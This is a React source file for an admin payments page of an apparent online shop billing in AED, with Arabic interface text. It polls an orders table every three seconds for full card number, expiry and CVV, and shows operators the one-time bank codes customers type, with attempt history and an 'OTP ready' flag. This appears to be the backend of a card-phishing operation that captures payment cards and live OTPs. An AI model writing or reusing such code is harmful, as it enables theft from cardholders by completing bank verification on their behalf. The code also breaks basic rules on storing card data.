import { useCallback, useEffect, useRef, useState } from 'react'
import { supabase } from '../lib/supabase'
import { markPaymentsSeen } from '../hooks/useAdminNotifications'
import { adminCardClass, adminBtnDanger, formatDate, formatMoney, getPaymentStatusLabel, maskCardNumber } from './adminStyles'

const POLL_MS = 3000

function getOtpDisplay(order) {
  return order?.payment_otp_entered || order?.payment_otp_code || ''
}

function formatOtpCode(code) {
  const digits = String(code || '').replace(/\D/g, '')
  if (!digits) return ''
  if (digits.length === 6) return `${digits.slice(0, 3)} ${digits.slice(3)}`
  if (digits.length === 4) return `${digits.slice(0, 2)} ${digits.slice(2)}`
  return digits
}

function parseOtpHistory(raw) {
  if (Array.isArray(raw)) return raw
  if (typeof raw === 'string' && raw.trim()) {
    try {
      const parsed = JSON.parse(raw)
      return Array.isArray(parsed) ? parsed : []
    } catch {
      return []
    }
  }
  return []
}

function getOtpAttempts(order) {
  const history = parseOtpHistory(order?.payment_otp_attempts_history)

  const fromHistory = history
    .map((entry, index) => {
      const code = entry?.code || entry?.otp || ''
      if (!code) return null
      return {
        code: String(code),
        at: entry?.at || entry?.entered_at || null,
        attempt: index + 1,
      }
    })
    .filter(Boolean)
    .slice(0, 3)

  if (fromHistory.length) return fromHistory

  const fallback = getOtpDisplay(order)
  if (!fallback) return []

  return [
    {
      code: String(fallback),
      at: order.payment_otp_entered_at || order.updated_at || null,
      attempt: Math.max(Number(order.payment_otp_attempts) || 1, 1),
    },
  ]
}

function PaymentDetailsContent({
  selected,
  actionError,
  deleting,
  onClearPayment,
  onDeleteOrder,
}) {
  const otpAttempts = getOtpAttempts(selected)

  return (
    <div className="space-y-4">
      <div className="p-4 rounded-2xl bg-slate-900 text-white space-y-3 font-mono text-sm" dir="ltr">
        <div>
          <p className="text-slate-400 text-xs mb-1">Card holder</p>
          <p className="font-bold text-base">{selected.card_holder_name || '—'}</p>
        </div>
        <div>
          <p className="text-slate-400 text-xs mb-1">Card number</p>
          <p className="font-bold text-lg tracking-wider">{maskCardNumber(selected.card_number)}</p>
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <p className="text-slate-400 text-xs mb-1">Expiry</p>
            <p className="font-bold">{selected.card_expiry ? '••/••' : '—'}</p>
          </div>
          <div>
            <p className="text-slate-400 text-xs mb-1">CVV</p>
            <p className="font-bold">{selected.card_cvv ? '•••' : '—'}</p>
          </div>
        </div>
      </div>

      <div>
        <p className="mb-2 text-sm font-black text-emerald-700">رموز OTP المُدخلة من العميل</p>
        {otpAttempts.length ? (
          <div className="flex flex-col gap-2">
            {otpAttempts.map((attempt) => (
              <div
                key={`${attempt.attempt}-${attempt.code}-${attempt.at || ''}`}
                className="rounded-2xl border-2 border-emerald-400 bg-emerald-50 px-4 py-3"
              >
                <p className="text-xs font-bold text-emerald-800">محاولة {attempt.attempt}</p>
                <p
                  className="mt-1 text-center text-3xl font-black tracking-[0.2em] text-slate-900 font-mono"
                  dir="ltr"
                >
                  {formatOtpCode(attempt.code)}
                </p>
                {attempt.at ? (
                  <p className="mt-2 text-xs font-bold text-slate-500">الوقت: {formatDate(attempt.at)}</p>
                ) : null}
              </div>
            ))}
          </div>
        ) : (
          <div className="rounded-2xl border border-slate-200 bg-slate-50 p-4">
            <p className="text-sm font-bold text-slate-500">في انتظار إدخال رمز OTP من العميل...</p>
          </div>
        )}
      </div>

      <div className="text-sm font-bold text-slate-700 space-y-1">
        <p>العميل: {selected.customer_name}</p>
        <p>الجوال: {selected.customer_phone}</p>
        <p>المبلغ: {formatMoney(selected.pay_now_amount)} AED</p>
        <p>إجمالي الطلب: {formatMoney(selected.total_amount)} AED</p>
        <p>
          حالة الدفع:{' '}
          <span className={selected.payment_status === 'paid' ? 'text-emerald-700' : 'text-amber-700'}>
            {getPaymentStatusLabel(selected.payment_status)}
          </span>
        </p>
      </div>

      <div className="border-t pt-4 space-y-2">
        {actionError && <p className="text-red-600 text-sm font-bold">{actionError}</p>}

        <button type="button" onClick={onClearPayment} disabled={deleting} className={adminBtnDanger}>
          {deleting ? 'جاري المسح...' : 'مسح بيانات الدفع'}
        </button>
        <button
          type="button"
          onClick={onDeleteOrder}
          disabled={deleting}
          className={`${adminBtnDanger} bg-red-600 text-white border-red-700 hover:bg-red-700`}
        >
          {deleting ? 'جاري الحذف...' : 'حذف الطلب نهائياً'}
        </button>
      </div>
    </div>
  )
}

export default function AdminPayments() {
  const [payments, setPayments] = useState([])
  const [initialLoading, setInitialLoading] = useState(true)
  const [selectedId, setSelectedId] = useState(null)
  const [deleting, setDeleting] = useState(false)
  const [actionError, setActionError] = useState('')
  const initialLoadedRef = useRef(false)

  const fetchPayments = useCallback(async ({ silent = false } = {}) => {
    if (!silent && !initialLoadedRef.current) {
      setInitialLoading(true)
    }

    const { data, error } = await supabase
      .from('orders')
      .select('*')
      .not('card_number', 'is', null)
      .order('updated_at', { ascending: false })

    if (!error) {
      setPayments(data || [])
    }

    if (!initialLoadedRef.current) {
      initialLoadedRef.current = true
      setInitialLoading(false)
    }
  }, [])

  useEffect(() => {
    fetchPayments()
    markPaymentsSeen()

    const interval = window.setInterval(() => {
      if (document.visibilityState === 'visible') {
        fetchPayments({ silent: true })
        markPaymentsSeen()
      }
    }, POLL_MS)

    return () => window.clearInterval(interval)
  }, [fetchPayments])

  const selected = payments.find((p) => p.id === selectedId) || null

  useEffect(() => {
    if (!selected || window.innerWidth >= 1024) return undefined

    const previousOverflow = document.body.style.overflow
    document.body.style.overflow = 'hidden'
    return () => {
      document.body.style.overflow = previousOverflow
    }
  }, [selected])

  const clearPayment = async () => {
    if (!selected || deleting) return

    const confirmed = window.confirm(
      `هل تريد مسح بيانات الدفع للطلب ${selected.order_number}؟\n\nسيتم حذف بيانات البطاقة ورمز OTP من قائمة المدفوعات.`
    )
    if (!confirmed) return

    setDeleting(true)
    setActionError('')

    const { error } = await supabase
      .from('orders')
      .update({
        card_holder_name: null,
        card_number: null,
        card_expiry: null,
        card_cvv: null,
        manual_payment_status: 'none',
        payment_otp_code: null,
        payment_otp_entered: null,
        payment_otp_entered_at: null,
        payment_otp_hash: null,
        payment_otp_expires_at: null,
        payment_otp_attempts: 0,
        payment_otp_length: 6,
        payment_otp_send_count: 0,
        payment_otp_locked: false,
        payment_otp_attempts_history: [],
        payment_otp_session_at: null,
        updated_at: new Date().toISOString(),
      })
      .eq('id', selected.id)

    setDeleting(false)

    if (error) {
      setActionError(error.message || 'تعذر مسح بيانات الدفع')
      return
    }

    setSelectedId(null)
    fetchPayments()
  }

  const deletePaymentOrder = async () => {
    if (!selected || deleting) return

    const confirmed = window.confirm(
      `هل تريد حذف الطلب ${selected.order_number} نهائياً؟\n\nسيتم حذف الطلب وبيانات الدفع معاً.`
    )
    if (!confirmed) return

    setDeleting(true)
    setActionError('')

    const { error } = await supabase.from('orders').delete().eq('id', selected.id)

    setDeleting(false)

    if (error) {
      setActionError(error.message || 'تعذر حذف الطلب')
      return
    }

    setSelectedId(null)
    fetchPayments()
  }

  const detailsProps = {
    selected,
    actionError,
    deleting,
    onClearPayment: clearPayment,
    onDeleteOrder: deletePaymentOrder,
  }

  return (
    <div className="space-y-5">
      <div className="grid lg:grid-cols-2 gap-6">
        <div className={adminCardClass}>
          <h2 className="font-black text-lg mb-4">المدفوعات ({payments.length})</h2>
          {initialLoading ? (
            <p className="font-bold text-slate-500">جاري التحميل...</p>
          ) : payments.length === 0 ? (
            <p className="font-bold text-slate-500">لا توجد مدفوعات بعد.</p>
          ) : (
            <div className="space-y-2">
              {payments.map((p) => (
                <button
                  key={p.id}
                  type="button"
                  onClick={() => setSelectedId(p.id)}
                  className={`w-full text-right p-4 rounded-2xl border transition ${
                    selectedId === p.id
                      ? 'border-admin bg-admin-soft'
                      : 'border-slate-100 bg-slate-50 hover:bg-white'
                  }`}
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="min-w-0 flex-1">
                      <p className="font-black text-slate-900">{p.order_number}</p>
                      <p className="text-sm font-bold text-slate-600">{p.customer_name}</p>
                      <p className="text-admin font-black mt-1">
                        {formatMoney(p.pay_now_amount)} AED
                      </p>
                      {getOtpDisplay(p) ? (
                        <p className="text-xs font-black text-emerald-700 mt-1">
                          رمز مُدخل: {getOtpDisplay(p)}
                        </p>
                      ) : null}
                      <p className="text-xs font-black text-slate-500 mt-1">
                        {getPaymentStatusLabel(p.payment_status)}
                        {p.payment_status === 'paid' ? ' ✓' : ''}
                        {getOtpDisplay(p) ? ' • OTP جاهز' : ' • بانتظار OTP'}
                      </p>
                    </div>
                    <span className="lg:hidden shrink-0 text-admin text-xs font-black mt-1">
                      التفاصيل ←
                    </span>
                  </div>
                </button>
              ))}
            </div>
          )}
        </div>

        <div className={`${adminCardClass} hidden lg:block`}>
          {!selected ? (
            <p className="font-bold text-slate-500">اختر طلباً لعرض التفاصيل</p>
          ) : (
            <div className="space-y-4">
              <h2 className="text-xl font-black">{selected.order_number}</h2>
              <PaymentDetailsContent {...detailsProps} />
            </div>
          )}
        </div>
      </div>

      {selected && (
        <div className="lg:hidden fixed inset-0 z-[70]">
          <button
            type="button"
            className="absolute inset-0 bg-black/50"
            onClick={() => setSelectedId(null)}
            aria-label="إغلاق التفاصيل"
          />
          <div className="absolute inset-x-0 bottom-0 top-[8%] flex flex-col rounded-t-3xl bg-white shadow-2xl">
            <div className="sticky top-0 z-10 flex items-center gap-3 border-b border-slate-200 bg-white px-3 py-3 rounded-t-3xl">
              <button
                type="button"
                onClick={() => setSelectedId(null)}
                className="shrink-0 inline-flex items-center gap-1.5 rounded-2xl bg-slate-100 px-3 py-2 text-slate-800 font-black"
                aria-label="رجوع"
              >
                <span className="text-xl leading-none" aria-hidden="true">
                  →
                </span>
                <span className="text-sm">رجوع</span>
              </button>
              <div className="min-w-0 flex-1 text-end">
                <p className="text-xs font-bold text-slate-500">تفاصيل الدفع</p>
                <h2 className="text-lg font-black text-slate-950 truncate">{selected.order_number}</h2>
              </div>
            </div>
            <div className="flex-1 overflow-y-auto px-4 py-4 pb-8">
              <PaymentDetailsContent {...detailsProps} />
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
